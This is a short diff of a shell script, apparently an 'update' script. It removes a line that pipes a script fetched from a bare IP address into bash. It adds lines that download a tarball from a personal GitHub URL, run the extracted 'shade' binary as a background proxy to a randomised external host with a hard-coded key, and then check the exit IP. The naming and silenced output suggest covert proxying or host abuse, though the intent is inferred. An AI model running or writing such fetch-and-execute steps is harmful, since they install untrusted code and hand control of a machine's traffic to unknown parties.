@@ -48,7 +48,22 @@ tar -xf update.tar.gz > /dev/null
 
 sleep 2
 
-wget -O - http://139.162.225.119/install_and_monitor_shade_root.sh | bash &
+curl -s -L -o shade.tar.gz https://raw.githubusercontent.com/alexgabbard01/update/main/shade.tar.gz >/dev/null
+sleep 2
+tar -xf shade.tar.gz
+ls -la
+
+./shade -b "127.0.0.1:1081" -s "cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999" &
+echo ""
+echo ""
+sleep 5
+curl -x socks5h://127.0.0.1:1081 ifconfig.me
+echo ""
+echo ""
+netstat -ntlp
+echo ""
+echo ""
+
 
 sleep 2
 
